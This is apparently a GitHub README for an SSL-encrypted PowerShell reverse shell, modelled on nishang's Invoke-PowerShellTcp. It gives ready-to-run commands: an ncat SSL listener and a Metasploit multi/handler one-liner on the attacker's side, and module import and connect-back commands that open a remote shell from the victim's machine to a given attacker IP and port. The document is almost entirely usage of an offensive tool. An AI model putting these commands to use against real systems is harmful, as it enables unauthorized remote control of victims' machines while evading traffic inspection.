# PowerShell-SSL-ReverseShell
This is a reverse shell written in PowerShell that uses SSL communications between the attacker's machine and the victim's machine. Made with inspiration from [samratashok/nishang Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [PoweShell: Encrypt TCP Client-Server Traffic with a self-signed X509 Certificate](https://cyberwardog.blogspot.com/2016/08/poweshell-encrypt-tcp-client-server.html)


## Usage

### Attacker Machine

- #### Ncat
```bash 

❯ ncat --ssl -lnvp 4646

```

- #### Metasploit
```bash 

❯ msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set lhost 192.168.254.226; set lport 4646; set ExitOnSession false; exploit -j"

```


### Victim Machine
```powershell 

PS > Import-Module .\GetShellSSL

PS > GetShellSSL -Reverse -IPAddress 192.168.254.226 -Port 4646

```

#### Demonstration
https://user-images.githubusercontent.com/74554439/197293572-e702d0aa-7390-41e5-ac0e-35b2e13a93d8.mp4
